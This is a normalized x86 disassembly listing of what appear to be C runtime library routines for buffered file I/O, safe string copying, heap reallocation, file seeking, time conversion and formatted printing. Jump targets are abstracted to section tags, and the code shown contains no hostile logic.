je r-xdata
push ebx
push edi
push ecx
call sub_2013580
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_2012cdf
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_200fb13
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_2013580
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_20134c9
pop ecx
push eax
call sub_20133cc
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_20134fb
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_200fa90
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_2013580
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_200a5fa
push 0xc
push r--data
call sub_200db54
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a3d3
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200a686
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_200db99
retn
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_2013580
add esp 0xc
sub_200a6e1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_200fb13
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_200a749
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_200fbfc
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_200ba67
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_20134c9
pop ecx
push eax
call sub_2013d2d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_2013e10
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_200a8ab
push 0xc
push r--data
call sub_200db54
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a749
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200a923
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
call sub_200db99
retn
sub_200a930
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_200a96a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_200fb13
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_2014880
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_2014550
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200aa80
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200a96a
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_200aaac
push 0x10
push r--data
call sub_200db54
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_2009eef
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_2009d98
pop ecx
jmp r-xdata
call sub_200db99
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_2011ee9
pop ecx
call sub_200fb13
push 0x4
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2010f6a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200abf0
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_2011468
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_2011ee9
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_2011ba9
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_200fb13
call sub_200fb13
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_2011ee9
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200fad1
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_200fb13
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_200fb13
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_2013e10
push ebx
call sub_2010f6a
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_2010f9a
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200fad1
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_2013e10
push ebx
push [ ebp - 0x20 ]
call sub_2010f9a
add esp 0x14
mov eax esi
sub_200acc7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_200fb13
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_200ad3b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_200ba67
push esi
mov ebx eax
call sub_2014ad3
push esi
call sub_20134c9
push eax
call sub_2014a06
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_2009d98
pop ecx
mov [ esi + 0x1c ] edi
sub_200adb2
push 0xc
push r--data
call sub_200db54
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_200ad3b
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200ae26
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_200db99
retn
mov eax [ ebp - 0x1c ]
sub_200ae2e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_20134c9
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x1
push ebx
push eax
call sub_2014b79
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_200fb13
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_2014b79
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_2014b79
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_200afcb
push 0xc
push r--data
call sub_200db54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_200ae2e
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b02f
mov eax [ ebp - 0x1c ]
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200db99
retn
sub_200b039
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_200fb13
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_200ba67
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_200ae2e
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_20134c9
pop ecx
push eax
call sub_2014b79
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_200b0c3
push 0xc
push r--data
call sub_200db54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b039
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b13e
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_200db99
retn
cmp edi 0x2
jne r-xdata
sub_200b148
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_2014c60
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_200b199
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200f7d9
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200f7d9
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_2014cd0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_200b28b
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b199
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_2014cd0
sub_200b2e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_200fdd2
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_200fbfc
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_200b381
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_200b44a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_2016140
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
pop edi
leave
retn
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x1c ] eax
sub_200b4b4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_2016206
call sub_200b44a
add esp 0x10
pop esi
pop ebp
retn
sub_200b4d6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push sub_2016206
call sub_200b44a
add esp 0x10
pop esi
pop ebp
retn
sub_200b4f9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_2017264
call sub_200b44a
add esp 0x10
pop esi
pop ebp
retn
sub_200b51b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push sub_2017264
call sub_200b44a
add esp 0x10
pop esi
pop ebp
retn
sub_200b54d
push 0xc
push r--data
call sub_200db54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_20125d6
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_20126ee
pop ecx
